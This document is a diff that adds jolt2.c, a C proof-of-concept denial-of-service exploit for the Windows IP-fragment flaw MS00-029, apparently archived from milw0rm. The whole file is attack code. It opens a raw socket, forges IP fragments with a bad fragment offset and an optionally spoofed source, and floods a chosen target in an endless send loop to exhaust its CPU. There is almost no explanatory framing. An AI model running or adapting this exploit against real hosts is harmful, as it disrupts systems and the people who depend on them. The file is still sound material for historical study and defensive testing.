@@ -1,0 +1,169 @@
+/*
+ * File:   jolt2.c
+ * Author: Phonix <phonix@moocow.org>
+ * Date:   23-May-00
+ *
+ * Description: This is the proof-of-concept code for the
+ *              Windows denial-of-serice attack described by
+ *              the Razor team (NTBugtraq, 19-May-00)
+ *              (MS00-029).  This code causes cpu utilization
+ *              to go to 100%.
+ *
+ * Tested against: Firewall-1
+ *
+ * Written for: My Linux box.  YMMV.  Deal with it.
+ *
+ * Thanks: This is standard code.  Ripped from lots of places.  
+ *         Insert your name here if you think you wrote some of 
+ *         it.  It's a trivial exploit, so I won't take credit  
+ *         for anything except putting this file together.      
+ */
+
+#include <stdio.h>
+#include <string.h>
+#include <netdb.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <netinet/in.h>
+#include <netinet/ip.h>
+#include <netinet/ip_icmp.h>
+#include <netinet/udp.h>
+#include <arpa/inet.h>
+#include <getopt.h>
+
+struct _pkt
+{
+  struct iphdr    ip;
+  union {
+    struct icmphdr  icmp;
+    struct udphdr   udp;
+  }  proto;
+  char data;
+} pkt;
+
+int icmplen  = sizeof(struct icmphdr),
+    udplen   = sizeof(struct udphdr),
+    iplen    = sizeof(struct iphdr),
+    spf_sck;
+
+void usage(char *pname)
+{
+  fprintf (stderr, "Usage: %s [-s src_addr] [-p port] dest_addr\n", pname);
+  fprintf (stderr, "Note: UDP used if a port is specified, otherwise ICMP\n");
+  exit(0);
+}
+
+u_long host_to_ip(char *host_name)
+{
+  static  u_long ip_bytes;
+  struct hostent *res;
+
+  res = gethostbyname(host_name);
+  if (res == NULL)
+    return (0);
+  memcpy(&ip_bytes, res->h_addr, res->h_length);
+  return (ip_bytes);
+}
+
+void quit(char *reason)
+{
+  perror(reason);
+  close(spf_sck);
+  exit(-1);
+}
+
+int do_frags (int sck, u_long src_addr, u_long dst_addr, int port)
+{
+  int     bs, psize;
+  unsigned long x;
+  struct  sockaddr_in to;
+
+  to.sin_family = AF_INET;
+  to.sin_port = 1235;
+  to.sin_addr.s_addr = dst_addr;
+
+  if (port)
+    psize = iplen + udplen + 1;
+  else
+    psize = iplen + icmplen + 1;
+  memset(&pkt, 0, psize);
+
+  pkt.ip.version = 4;
+  pkt.ip.ihl = 5;
+  pkt.ip.tot_len = htons(iplen + icmplen) + 40;
+  pkt.ip.id = htons(0x455);
+  pkt.ip.ttl = 255;
+  pkt.ip.protocol = (port ? IPPROTO_UDP : IPPROTO_ICMP);
+  pkt.ip.saddr = src_addr;
+  pkt.ip.daddr = dst_addr;
+  pkt.ip.frag_off = htons (8190);
+
+  if (port)
+  {
+    pkt.proto.udp.source = htons(port|1235);
+    pkt.proto.udp.dest = htons(port);
+    pkt.proto.udp.len = htons(9);
+    pkt.data = 'a';
+  } else {
+    pkt.proto.icmp.type = ICMP_ECHO;
+    pkt.proto.icmp.code = 0;
+    pkt.proto.icmp.checksum = 0;
+  }
+
+  while (1) {
+    bs = sendto(sck, &pkt, psize, 0, (struct sockaddr *) &to,
+              sizeof(struct sockaddr));
+  }
+  return bs;
+}
+
+int main(int argc, char *argv[])
+{
+  u_long  src_addr, dst_addr;
+  int i, bs=1, port=0;
+  char hostname[32];
+
+  if (argc < 2)
+    usage (argv[0]);
+
+  gethostname (hostname, 32);
+  src_addr = host_to_ip(hostname);
+
+  while ((i = getopt (argc, argv, "s:p:h")) != EOF)
+  {
+    switch (i)
+    {
+      case 's':
+        dst_addr = host_to_ip(optarg);
+        if (!dst_addr)
+          quit("Bad source address given.");
+        break;
+
+      case 'p':
+        port = atoi(optarg);
+        if ((port <=0) || (port > 65535))
+          quit ("Invalid port number given.");
+        break;
+
+      case 'h':
+      default:
+        usage (argv[0]);
+    }
+  }
+
+  dst_addr = host_to_ip(argv[argc-1]);
+  if (!dst_addr)
+    quit("Bad destination address given.");
+
+  spf_sck = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+  if (!spf_sck)
+    quit("socket()");
+  if (setsockopt(spf_sck, IPPROTO_IP, IP_HDRINCL, (char *)&bs,
+      sizeof(bs)) < 0)
+    quit("IP_HDRINCL");
+
+  do_frags (spf_sck, src_addr, dst_addr, port);
+}
+
+
+// milw0rm.com [2000-12-02]
